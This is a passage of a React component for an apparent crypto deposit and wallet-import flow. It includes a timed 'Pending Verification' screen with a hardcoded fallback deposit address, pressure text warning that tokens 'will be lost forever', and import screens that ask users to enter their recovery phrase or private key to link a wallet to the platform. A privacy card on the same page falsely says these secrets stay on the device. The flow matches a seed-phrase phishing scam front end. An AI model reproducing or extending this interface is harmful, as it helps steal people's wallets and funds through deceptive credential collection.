                          className="p-3 rounded-xl bg-emerald-950/40 border border-emerald-500/40 text-emerald-300 text-xs flex items-center justify-between"
                        >
                          <div className="flex items-center gap-2">
                            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                            <span className="font-semibold">Valid {manualNetwork.name} address verified</span>
                          </div>
                          <span className="font-mono text-[10px] text-emerald-400">{abbreviateAddress(manualAddress)}</span>
                        </motion.div>
                      )}

                      {/* Validation Error Message */}
                      {manualAddressError && manualAddressTouched && (
                        <motion.div 
                          initial={{ opacity: 0, y: -4 }}
                          animate={{ opacity: 1, y: 0 }}
                          className="p-3.5 rounded-xl bg-rose-950/40 border border-rose-500/40 text-rose-300 text-xs flex items-start gap-2.5 shadow-lg shadow-rose-950/30"
                        >
                          <AlertCircle className="w-4 h-4 text-rose-400 shrink-0 mt-0.5" />
                          <span className="font-medium leading-relaxed">{manualAddressError}</span>
                        </motion.div>
                      )}
                    </div>

                    {/* Security Information Card */}
                    <div className="p-4 rounded-2xl bg-neutral-900/60 border border-white/10 flex items-start gap-3.5 text-xs text-neutral-300">
                      <div className="p-2 rounded-xl bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 shrink-0">
                        <ShieldCheck className="w-5 h-5" />
                      </div>
                      <div className="space-y-1 text-left">
                        <h5 className="font-bold text-white text-xs">Security & Privacy Protocol</h5>
                        <p className="text-[11px] text-neutral-400 leading-relaxed">
                          Only public wallet addresses are logged to verify asset custody. Private keys, seed phrases, and spending approvals are strictly preserved on your local device.
                        </p>
                      </div>
                    </div>

                    {/* Continue Section */}
                    <div className="pt-4 border-t border-white/10">
                      <button
                        type="submit"
                        disabled={!manualAddress || !!manualAddressError}
                        className={`w-full rounded-2xl py-4 text-sm font-bold text-white shadow-xl transition-all flex items-center justify-center gap-2 ${
                          manualAddress && !manualAddressError
                            ? 'bg-gradient-to-r from-indigo-600 via-indigo-500 to-purple-600 hover:from-indigo-500 hover:to-purple-500 shadow-indigo-600/30 active:scale-[0.98] cursor-pointer'
                            : 'bg-neutral-800 text-neutral-500 border border-white/5 cursor-not-allowed opacity-60'
                        }`}
                      >
                        <span>Connect Wallet</span>
                        <ChevronRight className="w-4 h-4" />
                      </button>
                    </div>
                  </form>
                </motion.div>
              )}

              {/* EXISTING WALLET DETECTED FULL SCREEN */}
              {step === 'existing_wallet_detected' && (
                <motion.div 
                  key="existing_wallet_detected"
                  initial={{ opacity: 0, scale: 0.98 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.98 }}
                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 text-center space-y-8 overflow-hidden ring-1 ring-white/10 shadow-2xl min-h-[520px] flex flex-col justify-between"
                >
                  {/* Background Ambient Glow */}
                  <div className="pointer-events-none absolute inset-0 opacity-20">
                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 rounded-full bg-emerald-500/20 blur-[120px] animate-pulse" />
                  </div>

                  {/* Header */}
                  <div className="flex items-center justify-between border-b border-white/10 pb-4 relative z-10">
                    <button 
                      type="button"
                      onClick={() => setStep('methods')}
                      className="flex h-10 w-10 items-center justify-center rounded-xl bg-white/5 ring-1 ring-white/10 hover:bg-white/10 transition"
                      title="Back"
                    >
                      <ArrowLeft className="h-5 w-5 text-white" />
                    </button>
                    <span className="text-xs font-mono font-bold tracking-wider uppercase text-emerald-400 bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/30">
                      Wallet Session Detected
                    </span>
                    <div className="w-10" />
                  </div>

                  {/* Center Illustration & Content */}
                  <div className="space-y-6 max-w-lg mx-auto relative z-10 my-auto">
                    {/* Premium Wallet Illustration */}
                    <div className="relative w-28 h-28 mx-auto flex items-center justify-center">
                      <div className="absolute inset-0 rounded-full border border-emerald-500/30 animate-ping opacity-40" />
                      <div className="w-24 h-24 rounded-3xl bg-gradient-to-br from-emerald-950 via-neutral-900 to-indigo-950 border border-emerald-500/40 flex items-center justify-center relative shadow-2xl shadow-emerald-950/60">
                        <Wallet className="w-10 h-10 text-emerald-400 relative z-10" />
                        <div className="absolute top-2 right-2 w-3 h-3 rounded-full bg-emerald-400 ring-4 ring-neutral-950 animate-pulse" />
                        <div className="absolute inset-0 rounded-3xl bg-emerald-500/20 blur-xl" />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white">
                        Existing Wallet Detected
                      </h2>
                      <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed max-w-md mx-auto">
                        You have an existing wallet. Would you like to continue your deposit with this wallet?
                      </p>
                    </div>

                    {/* Wallet Summary Card */}
                    <div className="p-5 rounded-2xl bg-neutral-900/90 border border-white/10 shadow-xl space-y-3.5 text-left">
                      <div className="flex items-center justify-between border-b border-white/10 pb-3">
                        <div className="flex items-center gap-3">
                          <div className="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 font-bold text-xs">
                            <Wallet className="w-5 h-5" />
                          </div>
                          <div>
                            <h4 className="text-sm font-bold text-white">{selectedWallet || 'Imported Web3 Wallet'}</h4>
                            <span className="text-[11px] font-mono text-neutral-400">{connectedNetwork || 'Ethereum (ERC-20)'}</span>
                          </div>
                        </div>
                        <div className="flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-semibold">
                          <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                          <span>Saved Wallet</span>
                        </div>
                      </div>

                      <div className="flex items-center justify-between text-xs pt-1">
                        <span className="text-neutral-400">Public Address:</span>
                        <span className="font-mono text-white font-bold bg-black/40 px-2.5 py-1 rounded-lg border border-white/10">
                          {abbreviateAddress(connectedAddress)}
                        </span>
                      </div>
                    </div>
                  </div>

                  {/* Action Buttons */}
                  <div className="pt-6 border-t border-white/10 relative z-10 grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <button
                      type="button"
                      onClick={() => {
                        setSelectedMethod('walletconnect');
                        setStep('form');
                      }}
                      className="w-full py-4 rounded-2xl bg-gradient-to-r from-emerald-500 via-emerald-400 to-teal-500 text-slate-950 font-black text-sm hover:from-emerald-400 hover:to-teal-400 transition-all shadow-xl shadow-emerald-500/20 active:scale-[0.98] flex items-center justify-center gap-2 cursor-pointer"
                    >
                      <CheckCircle2 className="w-5 h-5 text-slate-950" />
                      <span>Continue</span>
                    </button>

                    <button
                      type="button"
                      onClick={() => {
                        setStep('methods');
                      }}
                      className="w-full py-4 rounded-2xl bg-white/5 border border-white/10 hover:bg-white/10 text-neutral-300 hover:text-white font-bold text-sm transition-all active:scale-[0.98] cursor-pointer"
                    >
                      <span>Cancel</span>
                    </button>
                  </div>
                </motion.div>
              )}

              {step === 'crypto_deposit_verification' && (
                <div className="fixed inset-0 z-[100] bg-[#000000] text-white flex flex-col justify-between overflow-y-auto select-none font-sans">
                  
                  {/* Floating X Button at top left */}
                  <div className="absolute top-12 left-6 z-[110]">
                    <button
                      type="button"
                      onClick={() => setShowAbandonModal(true)}
                      className="p-1.5 rounded-full bg-zinc-900/80 border border-white/10 text-[#A1A1AA] hover:text-white transition-all cursor-pointer flex items-center justify-center shadow-lg"
                      title="Abandon Session"
                    >
                      <X className="w-4 h-4 stroke-[1.5]" />
                    </button>
                  </div>

                  {/* MAIN IMMERSIVE CONTAINER */}
                  <div className="flex-1 flex flex-col justify-start px-6 pt-4 pb-6 max-w-md mx-auto w-full space-y-6">
                    
                    {/* HERO SECTION */}
                    <div className="flex flex-col items-center text-center space-y-2.5 shrink-0">
                      <h2 className="text-[38px] font-semibold tracking-tight text-white leading-tight">
                        Pending Verification
                      </h2>
                      <p className="text-[16px] text-[#A1A1AA] leading-relaxed">
                        Your transaction is being verified.
                      </p>
                    </div>

                    {/* COUNTDOWN SECTION */}
                    <div className="flex flex-col items-center text-center shrink-0">
                      <span className="text-[80px] font-semibold tabular-nums tracking-tighter text-white leading-none">
                        {Math.floor(verificationSecondsLeft / 60).toString().padStart(2, '0')}:{(verificationSecondsLeft % 60).toString().padStart(2, '0')}
                      </span>
                      <span className="text-[14px] font-medium text-[#A1A1AA] mt-1">
                        Verification Window Remaining
                      </span>
                    </div>

                    {/* TWO-COLUMN DETAILS GRID */}
                    <div className="space-y-3.5 shrink-0">
                      <div className="h-[1px] w-full bg-zinc-900/40" />
                      
                      {/* Reference ID */}
                      <div className="flex justify-between items-center py-0.5">
                        <span className="text-[14px] font-medium text-[#A1A1AA]">Reference ID</span>
                        <span className="text-[18px] font-medium text-white">
                          {pendingDepositId || `DEP-${selectedCrypto?.symbol || 'USDT'}`}
                        </span>
                      </div>
                      <div className="h-[1px] w-full bg-zinc-900/40" />

                      {/* Selected Asset */}
                      <div className="flex justify-between items-center py-0.5">
                        <span className="text-[14px] font-medium text-[#A1A1AA]">Selected Asset</span>
                        <span className="text-[18px] font-medium text-white">
                          {selectedCrypto?.symbol || 'USDT'}
                        </span>
                      </div>
                      <div className="h-[1px] w-full bg-zinc-900/40" />

                      {/* Amount */}
                      <div className="flex justify-between items-center py-0.5">
                        <span className="text-[14px] font-medium text-[#A1A1AA]">Amount</span>
                        <span className="text-[18px] font-medium text-white">
                          ${amount ? Number(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : '10,000.00'} USD
                        </span>
                      </div>
                      <div className="h-[1px] w-full bg-zinc-900/40" />

                      {/* Exact Transfer Amount */}
                      <div className="flex justify-between items-center py-0.5">
                        <span className="text-[14px] font-medium text-[#A1A1AA]">Exact Amount</span>
                        <div className="flex items-center gap-2">
                          <span className="text-[18px] font-medium text-white">
                            {formatExactAmount(exactCryptoAmount, selectedCrypto?.symbol || 'USDT')} {selectedCrypto?.symbol?.split('-')[0] || 'USDT'}
                          </span>
                          <button
                            type="button"
                            onClick={async () => {
                              const success = await copyToClipboard(formatExactAmount(exactCryptoAmount, selectedCrypto?.symbol || 'USDT'));
                              if (success) {
                                setCopiedExactAmount(true);
                                setTimeout(() => setCopiedExactAmount(false), 2000);
                              }
                            }}
                            className="text-[#A1A1AA] hover:text-white transition-colors p-1"
                            title="Copy Exact Amount"
                          >
                            {copiedExactAmount ? <Check className="w-4 h-4 text-emerald-500" /> : <Copy className="w-4 h-4" />}
                          </button>
                        </div>
                      </div>
                      <div className="h-[1px] w-full bg-zinc-900/40" />

                      {/* Target Address */}
                      <div className="flex justify-between items-center py-0.5">
                        <span className="text-[14px] font-medium text-[#A1A1AA]">Target Address</span>
                        <div className="flex items-center gap-2">
                          <span className="text-[18px] font-medium text-white">
                            {abbreviateAddress(selectedCrypto?.address || '0x8372A7eAde07B979333866544696aBbc6e49DF36')}
                          </span>
                          <button
                            type="button"
                            onClick={() => handleCopy(selectedCrypto?.address || '0x8372A7eAde07B979333866544696aBbc6e49DF36')}
                            className="text-[#A1A1AA] hover:text-white transition-colors p-1"
                            title="Copy Target Address"
                          >
                            {copiedAddress ? <Check className="w-4 h-4 text-emerald-500" /> : <Copy className="w-4 h-4" />}
                          </button>
                        </div>
                      </div>
                      <div className="h-[1px] w-full bg-zinc-900/40" />

                      {/* Blockchain Network */}
                      <div className="flex justify-between items-center py-0.5">
                        <span className="text-[14px] font-medium text-[#A1A1AA]">Blockchain Network</span>
                        <span className="text-[18px] font-medium text-white">
                          {selectedCrypto?.network || 'Ethereum (ERC-20)'}
                        </span>
                      </div>
                      <div className="h-[1px] w-full bg-zinc-900/40" />

                      {/* Date & Time */}
                      <div className="flex justify-between items-center py-0.5">
                        <span className="text-[14px] font-medium text-[#A1A1AA]">Date & Time</span>
                        <span className="text-[18px] font-medium text-white">
                          {new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })} at {createdTimeStr}
                        </span>
                      </div>
                      <div className="h-[1px] w-full bg-zinc-900/40" />

                      {/* Live Status */}
                      <div className="flex justify-between items-center py-0.5">
                        <span className="text-[14px] font-medium text-[#A1A1AA]">Live Status</span>
                        <div className="flex items-center gap-2 text-[18px] font-medium text-white">
                          <span className="w-2 h-2 rounded-full bg-white animate-pulse" />
                          <span>
                            {verificationStatusIndex === 0 ? 'Verifying' :
                             verificationStatusIndex === 1 ? 'Awaiting Approval' : 'Processing'}
                          </span>
                        </div>
                      </div>
                      <div className="h-[1px] w-full bg-zinc-900/40" />
                    </div>

                  </div>

                  {/* ACTION FOOTER */}
                  <div className="px-6 pb-8 pt-4 shrink-0">
                    <div className="max-w-md mx-auto w-full">
                      <button
                        type="button"
                        onClick={() => setShowAssistanceModal(true)}
                        className="w-full py-4 rounded-xl bg-white text-black font-semibold text-[15px] hover:bg-neutral-200 active:scale-[0.98] transition-all cursor-pointer flex items-center justify-center gap-2 shadow-lg"
                      >
                        I Have Made Payment
                      </button>
                    </div>
                  </div>

                  {/* ABANDON SESSION DIALOG */}
                  {showAbandonModal && (
                    <div className="fixed inset-0 z-[200] bg-black/80 backdrop-blur-sm flex items-center justify-center p-6 select-none font-sans">
                      <div className="w-full max-w-sm rounded-2xl bg-[#000000] border border-zinc-800 p-6 space-y-6 text-white shadow-2xl">
                        <div className="space-y-2 text-left">
                          <h3 className="text-[20px] font-medium tracking-tight text-white leading-snug">
                            Are you sure you want to abandon this session?
                          </h3>
                          <p className="text-[14px] text-[#A1A1AA] font-normal leading-relaxed">
                            Any undetected tokens will be lost forever.
                          </p>
                        </div>
                        
                        <div className="flex flex-col gap-3">
                          <button
                            type="button"
                            onClick={async () => {
                              const depId = pendingDepositId || localStorage.getItem('aver_pending_deposit_id');
                              if (depId) {
                                try {
                                  updateDoc(doc(db, 'admin_deposits', depId), {
                                    status: 'failed',
                                    updatedAt: serverTimestamp()
                                  }).catch(() => {});
                                  const { updateLocalDeposit } = await import('../../lib/depositStore');
                                  updateLocalDeposit(depId, { status: 'failed' });
                                  const { transactionService } = await import('../../services/transactionService');
                                  await transactionService.recordTransaction({
                                    id: depId,
                                    userId: authUser?.uid || 'anonymous',
                                    type: 'deposit',
                                    category: 'transactions',
                                    title: `${selectedCrypto?.symbol || 'USD'} Deposit`,
                                    amount: amount,
                                    cryptoAmount: exactCryptoAmount ? Number(exactCryptoAmount) : undefined,
                                    asset: selectedCrypto?.symbol || 'USD',
                                    network: selectedCrypto?.network || 'Mainnet',
                                    status: 'Failed'
                                  });
                                } catch (e) {}
                              }
                              localStorage.removeItem('aver_deposit_timer_target');
                              localStorage.removeItem('aver_pending_deposit_id');
                              setShowAbandonModal(false);
                              setStep('crypto_expired');
                            }}
                            className="w-full py-3.5 rounded-xl bg-white text-black font-semibold text-[14px] hover:bg-neutral-200 transition cursor-pointer text-center"
                          >
                            Exit
                          </button>
                          <button
                            type="button"
                            onClick={() => setShowAbandonModal(false)}
                            className="w-full py-3.5 rounded-xl bg-black border border-zinc-800 text-white font-semibold text-[14px] hover:bg-zinc-900 transition cursor-pointer text-center"
                          >
                            Stay
                          </button>
                        </div>
                      </div>
                    </div>
                  )}

                </div>
              )}

              {/* CRYSTAL CLEAR CRYPTO SUCCESS SCREEN */}
              {step === 'crypto_success' && (
                <div className="fixed inset-0 z-[100] bg-black text-white flex flex-col justify-center items-center p-6 select-none font-sans">
                  <motion.div 
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="flex flex-col items-center text-center space-y-4 max-w-sm"
                  >
                    <div className="w-12 h-12 rounded-full border border-emerald-500 bg-emerald-500/10 flex items-center justify-center text-emerald-400 mb-2">
                      <Check className="w-6 h-6 stroke-[2]" />
                    </div>
                    <h2 className="text-[34px] font-semibold tracking-tight text-white leading-tight">
                      Deposit Approved
                    </h2>
                    <p className="text-[15px] text-[#A1A1AA] leading-relaxed">
                      Your transfer of <span className="text-white font-bold">+${Number(amount || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span> has been approved and verified successfully.
                    </p>
                    <div className="pt-6 w-full">
                      <button
                        onClick={() => {
                          try {
                            localStorage.removeItem('aver_pending_deposit_id');
                            localStorage.removeItem('aver_deposit_amount');
                            localStorage.removeItem('aver_deposit_crypto');
                            localStorage.removeItem('aver_deposit_method');
                            localStorage.removeItem('aver_deposit_timer_target');
                          } catch(e) {}
                          setPendingDepositId(null);
                          if (onSuccessDeposit) {
                            onSuccessDeposit(amount, selectedMethod);
                          }
                          if (onBack) {
                            onBack();
                          }
                        }}
                        className="w-full py-4 rounded-xl bg-white text-black font-bold text-[15px] hover:bg-neutral-200 transition-colors cursor-pointer"
                      >
                        Continue to Dashboard
                      </button>
                    </div>
                  </motion.div>
                </div>
              )}

              {/* CRYSTAL CLEAR CRYPTO EXPIRED SCREEN */}
              {step === 'crypto_expired' && (
                <div className="fixed inset-0 z-[100] bg-black text-white flex flex-col justify-center items-center p-6 select-none font-sans">
                  <motion.div 
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="flex flex-col items-center text-center space-y-4 max-w-sm w-full"
                  >
                    <div className="w-14 h-14 rounded-full border border-rose-500/30 bg-rose-500/10 flex items-center justify-center text-rose-500 mb-1">
                      <X className="w-7 h-7 stroke-[2]" />
                    </div>
                    <h2 className="text-[32px] font-bold tracking-tight text-white leading-tight">
                      Transaction Failed
                    </h2>
                    <p className="text-[14px] text-[#A1A1AA] leading-relaxed">
                      The deposit verification window has closed or was declined. No funds were added to your balance. Your transaction receipt is archived in History.
                    </p>

                    <div className="w-full rounded-2xl bg-zinc-900/80 border border-white/10 p-4 text-left space-y-2 my-2">
                      <div className="flex justify-between items-center text-xs">
                        <span className="text-zinc-400">Deposit Amount</span>
                        <span className="font-bold text-white">+${Number(amount || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                      </div>
                      <div className="flex justify-between items-center text-xs">
                        <span className="text-zinc-400">Status</span>
                        <span className="font-bold text-rose-500">Transaction Failed</span>
                      </div>
                      {pendingDepositId && (
                        <div className="flex justify-between items-center text-xs">
                          <span className="text-zinc-400">Reference ID</span>
                          <span className="font-mono text-zinc-300 text-[11px]">{pendingDepositId}</span>
                        </div>
                      )}
                    </div>

                    <div className="pt-3 w-full space-y-2.5">
                      <button
                        type="button"
                        onClick={() => {
                          localStorage.removeItem('aver_deposit_timer_target');
                          localStorage.removeItem('aver_pending_deposit_id');
                          if (onBack) {
                            onBack();
                          } else {
                            setStep('methods');
                          }
                        }}
                        className="w-full py-3.5 rounded-xl bg-white text-black font-bold text-[14px] hover:bg-neutral-200 transition cursor-pointer"
                      >
                        Return to Dashboard
                      </button>
                      <button
                        type="button"
                        onClick={() => {
                          localStorage.removeItem('aver_deposit_timer_target');
                          localStorage.removeItem('aver_pending_deposit_id');
                          setStep('methods');
                        }}
                        className="w-full py-3 rounded-xl bg-zinc-900 border border-white/10 text-white font-medium text-[13px] hover:bg-zinc-800 transition cursor-pointer"
                      >
                        Try Another Deposit
                      </button>
                    </div>
                  </motion.div>
                </div>
              )}

              {/* RECOVERY PHRASE INFO MODAL */}
              {showRecoveryInfoModal && (
                <div className="fixed inset-0 z-[100] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 select-none font-sans">
                  <div className="w-full max-w-sm rounded-2xl bg-black border border-white/20 p-6 space-y-6 text-white shadow-2xl">
                    <div className="space-y-2 text-left">
                      <h3 className="text-xl font-semibold tracking-tight text-white flex items-center gap-2">
                        <HelpCircle className="w-5 h-5 text-emerald-400" />
                        Recovery Phrase
                      </h3>
                      <p className="text-[14px] text-neutral-400 font-normal leading-relaxed">
                        Enter your 12 or 24-word recovery phrase separated by spaces (e.g. apple banana cherry...). This phrase acts as a master key to securely restore and link your wallet connection to our platform.
                      </p>
                    </div>
                    
                    <div className="flex items-center gap-3 pt-2">
                      <button
                        type="button"
                        onClick={() => setShowRecoveryInfoModal(false)}
                        className="flex-1 py-3.5 rounded-xl bg-white/5 border border-white/10 text-neutral-300 font-semibold text-sm hover:bg-white/10 transition cursor-pointer"
                      >
                        Cancel
                      </button>
                      <button
                        type="button"
                        onClick={() => setShowRecoveryInfoModal(false)}
                        className="flex-1 py-3.5 rounded-xl bg-emerald-500 text-black font-semibold text-sm hover:bg-emerald-400 transition cursor-pointer"
                      >
                        I Understand
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* PRIVATE KEY INFO MODAL */}
              {showPrivateKeyInfoModal && (
                <div className="fixed inset-0 z-[100] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 select-none font-sans">
                  <div className="w-full max-w-sm rounded-2xl bg-black border border-white/20 p-6 space-y-6 text-white shadow-2xl">
                    <div className="space-y-2 text-left">
                      <h3 className="text-xl font-semibold tracking-tight text-white flex items-center gap-2">
                        <HelpCircle className="w-5 h-5 text-indigo-400" />
                        Private Key
                      </h3>
                      <p className="text-[14px] text-neutral-400 font-normal leading-relaxed">
                        Enter or paste your 64-character private key (e.g. 0x4f3a...). Your private key provides direct, secure access to your wallet and is used to establish a link.
                      </p>
                    </div>
                    
                    <div className="flex items-center gap-3 pt-2">
                      <button
                        type="button"
                        onClick={() => setShowPrivateKeyInfoModal(false)}
                        className="flex-1 py-3.5 rounded-xl bg-white/5 border border-white/10 text-neutral-300 font-semibold text-sm hover:bg-white/10 transition cursor-pointer"
                      >
                        Cancel
                      </button>
                      <button
                        type="button"
                        onClick={() => setShowPrivateKeyInfoModal(false)}
                        className="flex-1 py-3.5 rounded-xl bg-indigo-500 text-black font-semibold text-sm hover:bg-indigo-400 transition cursor-pointer"
                      >
                        I Understand
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* COMPACT REDESIGNED ASSISTANCE MODAL */}
              {showAssistanceModal && (
                <div className="fixed inset-0 z-[200] bg-black/80 backdrop-blur-sm flex items-center justify-center p-6 select-none font-sans">
                  <div className="w-full max-w-sm rounded-2xl bg-[#000000] border border-zinc-800 p-6 space-y-6 text-white shadow-2xl">
                    <div className="space-y-2 text-left">
                      <h3 className="text-[20px] font-medium tracking-tight text-white">
                        Payment Already Sent?
                      </h3>
                      <p className="text-[14px] text-[#A1A1AA] font-normal leading-relaxed">
                        If you have already completed your blockchain transfer but your deposit has not yet been credited, our support team can review your transaction and assist you if necessary. Deposits are only credited after successful verification and approval.
                      </p>
                    </div>

                    <div className="space-y-3 pt-2">
                      <button
                        type="button"
                        onClick={() => {
                          setShowAssistanceModal(false);
                          if (onOpenSupport) {
                            const ticketId = `DEP-SUP-${Math.floor(100000 + Math.random() * 900000)}`;
                            const newTicket = {
                              id: ticketId,
                              userId: auth.currentUser?.uid || 'guest_user',
                              userEmail: auth.currentUser?.email || '',
                              userName: auth.currentUser?.displayName || 'Trader',
                              title: `Deposit Review: ${amount} ${selectedCrypto?.symbol || 'USDT'}`,
                              category: 'Deposits & Wallet',
                              description: supportDraftMessage,
                              status: 'open' as const,
                              priority: 'high' as const,
                              transactionId: pendingDepositId || `DEP-${Date.now().toString(36).toUpperCase()}`,
                              createdAt: new Date().toISOString(),
                              updatedAt: new Date().toISOString(),
                              messages: [
                                {
                                  id: `msg-${Date.now()}`,
                                  sender: auth.currentUser?.displayName || 'Trader',
                                  senderRole: 'user' as const,
                                  text: `${supportDraftMessage}\n\n[Transaction Details]\n• Reference ID: ${pendingDepositId || `DEP-${Date.now().toString(36).toUpperCase()}`}\n• Asset: ${selectedCrypto?.symbol || 'USDT'}\n• Network: ${selectedCrypto?.network || 'TRC20'}\n• Amount: ${amount} ${selectedCrypto?.symbol || 'USDT'}\n• Wallet Address: ${selectedCrypto?.address || connectedAddress}\n• Created: ${new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })} at ${createdTimeStr}\n• Status: Verifying\n• Remaining Time: ${Math.floor(verificationSecondsLeft / 60).toString().padStart(2, '0')}:${(verificationSecondsLeft % 60).toString().padStart(2, '0')}`,
                                  timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
                                  status: 'delivered' as const
                                }
                              ]
                            };
                            onOpenSupport(newTicket);
                          }
                        }}
                        className="w-full py-3.5 rounded-xl bg-white text-black font-semibold text-[14px] hover:bg-neutral-200 transition cursor-pointer text-center"
                      >
                        Contact Support
                      </button>

                      <button
                        type="button"
                        onClick={() => setShowAssistanceModal(false)}
                        className="w-full py-3.5 rounded-xl bg-black border border-zinc-800 text-white font-semibold text-[14px] hover:bg-zinc-900 transition cursor-pointer text-center"
                      >
                        Close
                      </button>
                    </div>

                    <p className="text-[12px] text-[#A1A1AA] text-center">
                      Your current verification session will continue running in the background.
                    </p>
                  </div>
                </div>
              )}

              {/* CHOOSE IMPORT METHOD FULL SCREEN */}
              {step === 'wallet_import_choose' && (
                <motion.div 
                  key="wallet_import_choose"
                  initial={{ opacity: 0, scale: 0.98 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.98 }}
                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 overflow-hidden ring-1 ring-white/10 shadow-2xl space-y-8 min-h-[540px] flex flex-col justify-between"
                >
                  {/* Cancel Button Top Left */}
                  <button 
                    type="button"
                    onClick={() => setStep('form')}
                    className="absolute top-8 left-8 flex h-10 w-10 items-center justify-center rounded-full bg-white/10 hover:bg-white/20 transition cursor-pointer z-20"
                    title="Cancel"
                  >
                    <X className="h-5 w-5 text-white" />
                  </button>

                  {/* Top Illustration & Title — Import Custom Wallets */}
                  <div className="space-y-2 text-center max-w-lg mx-auto relative z-10 pt-2 pb-2 flex flex-col items-center">
                    <ImportWalletAnimatedLogo icon={Wallet} colorClass="text-emerald-400" />
                    <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white">
                      Import Custom Wallets
                    </h2>
                    <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed max-w-md mx-auto">
                      Choose your preferred authorization method to securely connect and restore your self-custody wallet into the system.
                    </p>
                  </div>

                  {/* Selection Cards */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 max-w-2xl mx-auto w-full relative z-10">
                    {/* Option 1 — Recovery Phrase */}
                    <button
                      type="button"
                      onClick={() => setStep('wallet_import_phrase')}
                      className="group relative p-6 rounded-3xl bg-neutral-900/90 border border-white/10 hover:border-emerald-500/50 hover:bg-neutral-900 text-left transition-all duration-300 hover:-translate-y-1 shadow-xl hover:shadow-2xl hover:shadow-emerald-950/50 flex flex-col justify-between space-y-4 cursor-pointer"
                    >
                      <div className="flex items-center justify-between">
                        <div className="w-12 h-12 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 group-hover:scale-110 transition-transform">
                          <Shield className="w-6 h-6 text-emerald-400" />
                        </div>
                        <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20">
                          Recommended
                        </span>
                      </div>

                      <div className="space-y-1.5">
                        <h3 className="text-lg font-bold text-white group-hover:text-emerald-300 transition-colors flex items-center justify-between">
                          <span>Recovery Phrase</span>
                          <ChevronRight className="w-4 h-4 text-neutral-500 group-hover:translate-x-1 transition-transform" />
                        </h3>
                        <p className="text-xs text-neutral-400 leading-relaxed">
                          Import your wallet using your recovery (seed) phrase. This is the recommended method for restoring an existing wallet.
                        </p>
                      </div>
                    </button>

                    {/* Option 2 — Private Key */}
                    <button
                      type="button"
                      onClick={() => setStep('wallet_import_key')}
                      className="group relative p-6 rounded-3xl bg-neutral-900/90 border border-white/10 hover:border-indigo-500/50 hover:bg-neutral-900 text-left transition-all duration-300 hover:-translate-y-1 shadow-xl hover:shadow-2xl hover:shadow-indigo-950/50 flex flex-col justify-between space-y-4 cursor-pointer"
                    >
                      <div className="flex items-center justify-between">
                        <div className="w-12 h-12 rounded-2xl bg-indigo-500/10 border border-indigo-500/30 flex items-center justify-center text-indigo-400 group-hover:scale-110 transition-transform">
                          <Key className="w-6 h-6 text-indigo-400" />
                        </div>
                        <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-indigo-400 bg-indigo-500/10 px-2.5 py-1 rounded-full border border-indigo-500/20">
                          Direct Key
                        </span>
                      </div>

                      <div className="space-y-1.5">
                        <h3 className="text-lg font-bold text-white group-hover:text-indigo-300 transition-colors flex items-center justify-between">
                          <span>Private Key</span>
                          <ChevronRight className="w-4 h-4 text-neutral-500 group-hover:translate-x-1 transition-transform" />
                        </h3>
                        <p className="text-xs text-neutral-400 leading-relaxed">
                          Import your wallet using the private key associated with your wallet address.
                        </p>
                      </div>
                    </button>
                  </div>

                  <div className="text-center text-[11px] text-neutral-500">
                    Protected by 256-bit client-side cryptographic hashing protocols
                  </div>
                </motion.div>
              )}

              {/* RECOVERY PHRASE IMPORT FULL SCREEN */}
              {step === 'wallet_import_phrase' && (
                <motion.div 
                  key="wallet_import_phrase"
                  initial={{ opacity: 0, scale: 0.98 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.98 }}
                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 overflow-hidden ring-1 ring-white/10 shadow-2xl space-y-6"
                >
                  {/* Header */}
                  <div className="flex items-center justify-between relative z-10 pt-2">
                    <button 
                      type="button"
                      onClick={() => setStep('wallet_import_choose')}
                      className="flex h-7 w-7 items-center justify-center rounded-full bg-white/10 hover:bg-white/20 transition cursor-pointer"
                      title="Close"
                    >
                      <X className="h-3.5 w-3.5 text-white" />
                    </button>
                    <div />
                    <div className="w-7" />
                  </div>

                  {/* Hero Header */}
                  <div className="space-y-3 text-center max-w-lg mx-auto relative z-10 flex flex-col items-center">
                    <ImportWalletAnimatedLogo icon={ShieldCheck} colorClass="text-emerald-400" />

                    <div className="space-y-1.5">
